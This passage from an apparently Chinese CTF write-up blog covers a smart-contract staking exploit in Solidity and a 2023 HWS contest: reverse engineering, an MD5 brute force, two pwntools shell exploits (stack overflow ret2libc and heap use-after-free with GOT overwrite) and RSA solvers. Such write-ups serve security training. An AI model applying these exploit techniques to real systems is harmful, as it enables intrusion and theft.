<p>对于第二点，由于 StakeWETH 函数被调用后没有检查 WETH.call
是否成功，所以我们可以实现零成本增加 totalStake</p>
<p>对于第三点，我们只需要调用 StakeETH 就能顺带成为 Staker</p>
<p>对于第四点，只要调用 unStake 全部取出就好了。</p>
<p>我们可以看以下几点：</p>
<p>getBalance(stake): Stake 合约的 ETH</p>
<p>totalStaked: totalStaked</p>
<p>Stakers[player]: 我们是不是 Staker</p>
<p>UserStake[player]: 我们的 staked balance</p>
<p>所以我们的逻辑如下：</p>
<p>用其他合约调用 WETH.allowance(0.0012 ether)，再用其他合约调用
StakeWETH(0.0012 ether)，同时自毁这个合约。这样，在不增加
UserStake[player] 的前提下，增加了 totalStaked，同时增加了合于存储的
ETH，满足了第一二点</p>
<p>我们自己调用 StakeETH(0.0011 ether), 增加了 totalStaked 和 Stake
合约的 ETH，将我们自己设置为 Staker，满足了第三点</p>
<p>我们自己再调用 Unstak(0,0011 ether)，将我们的 staked balance
清零，满足了第四点</p>
<p>exp 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.26;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/interfaces/IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface Stake &#123;</span><br><span class="line">    function StakeETH() external payable;</span><br><span class="line">    function StakeWETH(uint256 amount) external returns (bool);</span><br><span class="line">    function Unstake(uint256 amount) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address target = 0xF5B752EfD47fDCd58da29a3389FF4E08484B6a45;</span><br><span class="line">    address weth_address = 0xCd8AF4A0F29cF7966C051542905F66F5dca9052f;</span><br><span class="line">    Stake stake;</span><br><span class="line">    IERC20 weth;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        weth = IERC20(weth_address);</span><br><span class="line">        stake = Stake(target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        require(msg.value == 0.001 ether);</span><br><span class="line">        weth.approve(address(stake), 0.0012 ether);</span><br><span class="line">        stake.StakeWETH(0.0012 ether);</span><br><span class="line">        selfdestruct(payable(address(stake)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">await contract.StakeETH(&#123;value: toWei(&quot;0.0011&quot;)&#125;);</span><br><span class="line">await contract.Unstake(toWei(&quot;0.0011&quot;));</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Smart Contract</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2023HwsSDU专场CTF-wp</title>
    <url>/2023/11/19/comp%20-%202023HwsSDU%E4%B8%93%E5%9C%BACTF-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
HWS！PWN+RE+CRYPTO
</blockquote>
<span id="more"></span>
<h1 id="re">RE</h1>
<h2 id="re-1">Re</h2>
<blockquote>
<p>这个题本来打好逆向后的包准备写 wp
的，结果重新加载的时候给覆盖了...就不配图了，函数顺序按照反汇编从上到下来分析的。</p>
</blockquote>
<p>拿到这个题看到有反调试，没 patch ，直接静态分析了</p>
<h4 id="st-important-function">- 1st important function</h4>
<p>第一个重要函数里有一个 flag{} 的判断，还有一个对于'-'的判断，可以猜测
flag 的格式为 flag{uuid}</p>
<p>接下来的一个函数有花指令，把 E8 改成 90
以后重新反汇编，还是没有啥东西...为了不影响后面做题，还是回到一开始的地方把
jz 改成了 jnz
，然后动调发现这个带花的函数基本没啥用，好像就调用了个<code>__chkesp</code>函数，但我不太清楚这是干啥的，就直接忽略了</p>
<h4 id="nd-important-function">- 2nd important function</h4>
<p>第二个重要函数对我们输入的 flag
做了一些操作，把中间的'-'全部删掉，并做了一些移动的操作，大概就是
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa&#125;</span><br><span class="line">flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="rd-important-function">- 3rd important function</h4>
<p>第三个函数将 uuid 的前 32
个字节作为参数，做了一些异或操作和比对操作，我们可以恢复一部分 flag
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> encdata1[<span class="number">13</span>];</span><br><span class="line"><span class="type">char</span> encdata2[<span class="number">16</span>];</span><br><span class="line"><span class="type">int</span> encdata3[<span class="number">22</span>];</span><br><span class="line"><span class="type">char</span> flag[<span class="number">42</span>]=<span class="string">&quot;flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaxxxx&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    encdata1[<span class="number">0</span>] = <span class="number">102</span>;</span><br><span class="line">    encdata1[<span class="number">1</span>] = <span class="number">52</span>;</span><br><span class="line">    encdata1[<span class="number">2</span>] = <span class="number">51</span>;</span><br><span class="line">    encdata1[<span class="number">3</span>] = <span class="number">49</span>;</span><br><span class="line">    encdata1[<span class="number">4</span>] = <span class="number">52</span>;</span><br><span class="line">    encdata1[<span class="number">5</span>] = <span class="number">57</span>;</span><br><span class="line">    encdata1[<span class="number">6</span>] = <span class="number">96</span>;</span><br><span class="line">    encdata1[<span class="number">7</span>] = <span class="number">60</span>;</span><br><span class="line">    encdata1[<span class="number">8</span>] = <span class="number">61</span>;</span><br><span class="line">    encdata1[<span class="number">9</span>] = <span class="number">34</span>;</span><br><span class="line">    encdata1[<span class="number">10</span>] = <span class="number">104</span>;</span><br><span class="line">    encdata1[<span class="number">11</span>] = <span class="number">33</span>;</span><br><span class="line">    encdata1[<span class="number">12</span>] = <span class="number">56</span>;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i % <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            flag[count] = encdata1[i] ^ (<span class="number">2</span>*i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            flag[count] = encdata1[i] ^ i;</span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">func1</span>();</span><br><span class="line">    cout&lt;&lt;flag&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># flag&#123;f61703f2-50b7-4aaa-aaaa-aaaaaaaaaaaa&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>可以看到，这个函数只对前13个字节做了操作，剩下的19个字节没用到</p>
<h4 id="th-important-function">- 4th important function</h4>
<p>第四个函数将 uuid
的中间18位放了进去，然后做了一大堆操作以后跟下面的东西做了比较</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">v5[<span class="number">0</span>] = <span class="number">63</span>;</span><br><span class="line">v5[<span class="number">1</span>] = <span class="number">-70</span>;</span><br><span class="line">v5[<span class="number">2</span>] = <span class="number">-60</span>;</span><br><span class="line">v5[<span class="number">3</span>] = <span class="number">-111</span>;</span><br><span class="line">v5[<span class="number">4</span>] = <span class="number">-60</span>;</span><br><span class="line">v5[<span class="number">5</span>] = <span class="number">116</span>;</span><br><span class="line">v5[<span class="number">6</span>] = <span class="number">2</span>;</span><br><span class="line">v5[<span class="number">7</span>] = <span class="number">38</span>;</span><br><span class="line">v5[<span class="number">8</span>] = <span class="number">-20</span>;</span><br><span class="line">v5[<span class="number">9</span>] = <span class="number">-110</span>;</span><br><span class="line">v5[<span class="number">10</span>] = <span class="number">56</span>;</span><br><span class="line">v5[<span class="number">11</span>] = <span class="number">-62</span>;</span><br><span class="line">v5[<span class="number">12</span>] = <span class="number">11</span>;</span><br><span class="line">v5[<span class="number">13</span>] = <span class="number">109</span>;</span><br><span class="line">v5[<span class="number">14</span>] = <span class="number">39</span>;</span><br><span class="line">v5[<span class="number">15</span>] = <span class="number">-45</span>;</span><br></pre></td></tr></table></figure>
<p>由于看到了这个函数里面有个子函数有超长的一串，虽然看不懂，但我怀疑这应该是某个加密算法的手搓版，于是就问
GPT 老师，它跟我说是MD5加密算法的一部分(后来用 findcrypt
插件也能看出来)。</p>
<p>而后面还有个函数是这18位中前14位的 base64_encode
，也就是说我们解码后只需要爆破后4位即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_md5</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)).digest()</span><br><span class="line"></span><br><span class="line">target_hash = ([<span class="number">63</span>, -<span class="number">70</span>, -<span class="number">60</span>, -<span class="number">111</span>, -<span class="number">60</span>, <span class="number">116</span>, <span class="number">2</span>, <span class="number">38</span>, -<span class="number">20</span>, -<span class="number">110</span>, <span class="number">56</span>, -<span class="number">62</span>, <span class="number">11</span>, <span class="number">109</span>, <span class="number">39</span>, -<span class="number">45</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># 将i和j转换为两位16进制数</span></span><br><span class="line">                hex_i = <span class="built_in">format</span>(i, <span class="string">&#x27;01x&#x27;</span>)</span><br><span class="line">                hex_j = <span class="built_in">format</span>(j, <span class="string">&#x27;01x&#x27;</span>)</span><br><span class="line">                hex_k = <span class="built_in">format</span>(k, <span class="string">&#x27;01x&#x27;</span>)</span><br><span class="line">                hex_m = <span class="built_in">format</span>(m, <span class="string">&#x27;01x&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 构建待加密的明文</span></span><br><span class="line">                plaintext = <span class="string">f&#x27;f47813c26594c0<span class="subst">&#123;hex_i&#125;</span><span class="subst">&#123;hex_j&#125;</span><span class="subst">&#123;hex_k&#125;</span><span class="subst">&#123;hex_m&#125;</span>&#x27;</span></span><br><span class="line">                <span class="comment"># print(plaintext)</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 计算MD5散列值</span></span><br><span class="line">                hashed_text = generate_md5(plaintext)</span><br><span class="line">                <span class="comment"># print(hashed_text.hex())</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> hashed_text.<span class="built_in">hex</span>() == <span class="string">&#x27;3fbac491c4740226ec9238c20b6d27d3&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;f61703f2-50b7-4f47-813c-26594c0e581a&#125; // 这里的最后一位 a 不是真的 a ，是因为一开始我写的 flag 格式是a，这一位还是需要我们爆破的</span></span><br></pre></td></tr></table></figure>
<p>拿到平台上去爆破最后一位，没想到直接就是 0 ，一遍过~</p>
<blockquote>
<p>flag{f61703f2-50b7-4f47-813c-26594c0e5810}</p>
</blockquote>
<h1 id="pwn">PWN</h1>
<h2 id="inverse">inverse</h2>
<p>32位 + 整数溢出 + 简单栈溢出，思路真没啥好写的，直接上exp吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;124.71.135.126:30011&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(ip[<span class="number">0</span>],<span class="built_in">int</span>(ip[<span class="number">1</span>]))</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">io.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">work_addr = <span class="number">0x80493D5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p32(puts_plt) + p32(work_addr) + p32(read_got)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27; msg:&#x27;</span>)</span><br><span class="line">read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read_addr  ---&gt;  &#x27;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh  =  libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">bin_sh = <span class="number">0x0804C030</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base  ---&gt;  &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr  ---&gt;  &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bin_sh  ---&gt;  &#x27;</span>,<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p32(sys_addr) + p32(work_addr) + p32(bin_sh)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="controller">controller</h2>
<p>这题是 awdp/awd 的题吧，好多洞...但是为什么 patchelf
以后会给我报<code>libgcc_s.so.0</code>的错啊，我还从
lib64/lib/2.27libgcc库 中拷贝了对应文件，结果都不行...</p>
<p>灰盒的 heap 题太难打了...不过从22:00打到3:00出 flag
的一瞬间真的巨爽</p>
<p>这题逆向就挺费时间的，一堆没啥用的函数，就只有<code>choice == 1/2/3/6(堆题的uaf) || choice == 1/9(fmt + 栈)</code></p>
<p>...写 wp 的时候去看了一下 choice == 9，结果突然发现 strlen 用''
就可以随便绕...早知道不灰盒打堆了...</p>
<p>我的思路是 uaf + fastbin attack</p>
<ul>
<li>alloc 再 free 两个 chunk<br />
</li>
<li>由于 fastbin LIFO，利用 uaf 将 heap_list (堆指针表)的地址写入
chunk13 的 fd 和 bk</li>
<li>申请两个同样大小的 chunk ，我们就能用 chunk15 任意地址读写了</li>
<li>leak
<ul>
<li>首先把 malloc 的 got 写进 chunk15，然后 show，就可以leak libc
基址</li>
</ul></li>
<li>write
<ul>
<li>由于这个时候，heap_list 中还存有 malloc_got
，于是我们直接控制这个指针去写 malloc_got 指向的地址</li>
</ul></li>
<li>将 one_gadget 写入 malloc_got 指向的地址，当我们再去 malloc
的时候，就会调用 og 进而提权。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;124.71.135.126:30070&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(ip[<span class="number">0</span>],<span class="built_in">int</span>(ip[<span class="number">1</span>]))</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size,content1,content2</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;length of the new pipe name? &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;name of the new pipe? &#x27;</span>, content1)</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Please write a description: &#x27;</span>, content2)</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;(radius,speed,length): &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Please choose pipe: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendline()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Choose &gt;&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Please choose pipe: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Plese input info &gt;&#x27;</span>,content)</span><br><span class="line">  io.sendline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># def show(index):</span></span><br><span class="line"><span class="comment">#   io.sendlineafter(&#x27;&gt; &#x27;, str(1))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">content1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">content2 = <span class="string">&#x27;b&#x27;</span>*<span class="number">80</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>,content1,content2) <span class="comment"># 12</span></span><br><span class="line">alloc(<span class="number">0x30</span>,content1,content2) <span class="comment"># 13</span></span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">content = p64(<span class="number">0x60418f</span>)</span><br><span class="line">edit(<span class="number">13</span>,content)</span><br><span class="line">alloc(<span class="number">0x30</span>,content1,content1) <span class="comment"># 14</span></span><br><span class="line"></span><br><span class="line">malloc_got = elf.got[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">content1 = <span class="string">b&#x27;\x00\x00\x00\x01\x00\x00\x02\x40\x00&#x27;</span> + p64(malloc_got) + p64(malloc_got)</span><br><span class="line">alloc(<span class="number">0x30</span>,content1,content1) <span class="comment"># 15</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># io.sendlineafter(&#x27;&gt; &#x27;, str(11))</span></span><br><span class="line"><span class="comment"># io.sendlineafter(&#x27;&gt; &#x27;, str(1))</span></span><br><span class="line">malloc_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(malloc_addr))</span><br><span class="line">libc_base = malloc_addr - libc.sym[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">og = [<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">get_shell = libc_base + og[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(get_shell))</span><br><span class="line">content = p64(get_shell)</span><br><span class="line">io.sendline()</span><br><span class="line">edit(<span class="number">2</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>为了写这题我还特意写了个 exp_local.py 来测试本地高版本libc的堆..</p>
</blockquote>
<h1 id="crypto">Crypto</h1>
<blockquote>
<p>没想到 ak 的居然是密码，这俩都是板子题</p>
</blockquote>
<h2 id="ezrsa">ezRSA</h2>
<p>这题两个数的位置反了😭卡了好长时间来着，我说为什么 getPrime 生成的 p
怎么会不是素数</p>
<p>这题一眼求解二次剩余，公钥课上学过(没想到课堂上的东西能拿来打CTF)，从网上扒一个脚本直接解
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=<span class="number">13107939563507459774616204141253747489232063336204173944123263284507604328885680072478669016969428366667381358004059204207134817952620014738665450753147857</span></span><br><span class="line">a=<span class="number">4124820799737107236308837008524397355107786950414769996181324333556950154206980059406402767327725312238673053581148641438494212320157665395208337575556385</span></span><br><span class="line"></span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">P=(p-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> p%<span class="number">4</span>==<span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(gmpy2.powmod(a,<span class="built_in">int</span>((p+<span class="number">1</span>)//<span class="number">4</span>),p))</span><br><span class="line">    <span class="built_in">print</span>(-gmpy2.powmod(a,<span class="built_in">int</span>((p+<span class="number">1</span>)//<span class="number">4</span>),p))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">while</span> P%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        P=P//<span class="number">2</span></span><br><span class="line">        k=k+<span class="number">1</span></span><br><span class="line">    q=<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> q: </span><br><span class="line">        l=gmpy2.powmod(q,<span class="built_in">int</span>((p-<span class="number">1</span>)//<span class="number">2</span>),p)</span><br><span class="line">        <span class="keyword">if</span> l==p-<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        q=sympy.nextprime(q)</span><br><span class="line">    b=gmpy2.powmod(q,P,p)</span><br><span class="line">    x=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k)]</span><br><span class="line">    re_a=gmpy2.invert(a,p)</span><br><span class="line">    x[k-<span class="number">1</span>]=gmpy2.powmod(a,<span class="built_in">int</span>((P+<span class="number">1</span>)//<span class="number">2</span>),p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,k):</span><br><span class="line">        m=re_a*<span class="built_in">pow</span>(x[k-i],<span class="number">2</span>)</span><br><span class="line">        n=<span class="built_in">pow</span>(<span class="number">2</span>,(k-i-<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> gmpy2.powmod(m,n,p)==p-<span class="number">1</span>:</span><br><span class="line">            j0=<span class="number">1</span></span><br><span class="line">            x[k-i-<span class="number">1</span>]=x[k-i]*<span class="built_in">pow</span>(b,j0*(<span class="number">2</span>**(i-<span class="number">1</span>)))%p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j1=<span class="number">0</span></span><br><span class="line">            x[k-i-<span class="number">1</span>]=x[k-i]%p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(p-x[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.imgs.ovh/2023/11/19/H0sMV.png" /> ## hdRSA</p>
<p>3:00-5:00就在找这道题的关键词...</p>
<p>从 "rsa 特殊构造p" 到 "rsa D*V**2+1" 再到 "rsa
4p+1"，终于让我找到有用的东西了，从<a
href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html">Lazzzaro的这篇博客</a>里，找到了<a
href="https://github.com/crocs-muni/cm_factorization/tree/master">这个工具</a>,直接
tmux 四个窗口梭哈遍历 D！</p>
<p><img src="https://i.imgs.ovh/2023/11/19/H0KdW.png" /></p>
<p>分解出 pq 来以后就是常规 rsa 了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">187275367513186345104534865239994699892170904489725413330767115192172530253625393062151741036312498277557971553595091826062438445856091864605758318579599363539202154625683947568962358702545878760994434813222953503460910447662183200334960821110618746899798165363389255347363192576250804362413854445821046755759458439443253294822553986237695607000569717855942461517564526611106601774100617668231506539201297550376834067118784548951699927659889815770492684106287801610261026674778509245649501695344652216367741171392139049785280654043804502329999760613658697298671602787929199239524617160567336634126185042907593427921016129734757065504417112269027028799047579450965076835882020261162192475637278445255805339324893626400179818784574957669576516363342104273184813708475202313539634027764340858242764934872804570810575764191987921655276520658100755510986290562980055133376750812535713567917823663134974180449002466833109112866681229626239871954125027501071383217816313440079294139254989413050731511516498127225020975071747314764552267845933494600295296885808466296844091612401062566502515356974852161817112538289440970059783116540091633055220150093646069438113246518726017868258339512247175386052684861670431148484455765445960495130308147156436998327553854387741014177421559585683382003377803158283603889312107837885491964835073892174406797445622388505256985237867456926792546588756970045576002345376035346727906264683596628903417932566383221754976804148878057310066885140776352202510584461556988179369177560403923399529842871087532495739921906849249072433614545319458973155343802539527630971239359995893495205324483418191744545506744253222956232506980824457995662900264427265978239540089825733734306363153471606200228841997928021468359645661221933848545854596097640552489404777927679709089475954033350287287833943519423030861868256961619722983499902810335</span></span><br><span 